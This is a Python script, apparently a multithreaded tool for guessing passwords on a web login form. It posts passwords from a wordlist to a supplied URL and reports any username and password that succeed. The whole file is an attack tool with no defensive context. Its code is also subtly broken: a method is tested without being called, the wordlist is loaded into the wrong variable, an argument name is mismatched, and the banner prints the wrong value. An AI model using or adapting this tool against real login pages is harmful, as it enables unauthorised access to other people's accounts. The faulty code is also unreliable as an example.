from os import path
import argparse,requests
from queue import Queue
from threading import Thread
from sys import exit
import time
from termcolor import colored
def get_args():
    """Function to handle arguments"""
    parser=argparse.ArgumentParser()
    
    parser.add_argument('-l','--username',dest="username",help="Username to test upon")
    
    parser.add_argument('-u','--url',dest="url",help="give the location where to POST that request")
    
    parser.add_argument('-p','--password_file',dest="password_file",help="Specify the password file")
    
    parser.add_argument('-threads',dest="threads",help="Specify the threads ")
    
    parser.add_argument('-paramusername',dest="usernameparam",required=True,help="Specify the username param going in the post request")
    
    parser.add_argument('-parampassword',dest="passwordparam",required=True,help="Specify the Password param going in the post request")
    
    parser.add_argument('-invalidtext',required=False,dest="invalidtext",help="Specify the text that you get on wrong password !")
    
    return parser.parse_args()

def password_brute(passwords):
    params = {usernameparam: username}
    while not passwords.empty:
        time.sleep(5) 
        passwd=passwords.get()
        params[passwordparam]=passwd
        print(f"[Attempt] Username: {username} {passwd}")
        with requests.session() as session:
            response=session.post(url,data=params)
            if invalidtext not in response.content.decode():
                print("Password Found Successfully! ")
                print(f"Username:{username} Password:{passwd}")
                break

def handle_threads(threads):
    """ handle threads """
    password=[]
    global passwords


    with open(password_file,'r') as f:
        password.extend(word.strip() for word in f)
    for _ in range(threads):
        thread=Thread(target=password_brute,args=(passwords,))
        thread.daemon=True
        thread.start()


    for word in passwords:
        passwords.put(word)
    passwords.join()
    

def print_banner(url,usernameparam,username,passwordparam,password_file,threads):
    from datetime import datetime
    print("-"*80)
    print(colored(f"Http Form bruteforcing starting at {datetime.now().strftime('%d/%m/%Y %H:%M:%S')}",'yellow',attrs=['bold']))
    print("-"*80)
    print("[*] Url".ljust(20," "),":",f"{url}")
    print("[*] Threads".ljust(20," "),":",f"{threads}")
    print("[*] Username".ljust(20," "),":",f"{username}")
    print("[*] Password File".ljust(20," "),":",f"{password_file}")
    print("[*] Username Param".ljust(20," "),":",f"{usernameparam}")
    print("[*] Password Param".ljust(20," "),":",f"{password_brute}")
    print("-"*80)

if __name__=="__main__":
    passwords=Queue()
    arguments=get_args()

    usernameparam=arguments.usernameparam
    username=arguments.username
    invalidtext=arguments.invalidtext
    passwordparam=arguments.passwordparam
    url=arguments.url
    threads=arguments.Threads
    password_file=arguments.password_file
    if not path.exists(password_file):
        print(colored("[-] Provide a valid Password File",'red'))
        exit(1)


    print_banner(url,usernameparam,username,passwordparam,password_file,threads)
    handle_threads(threads)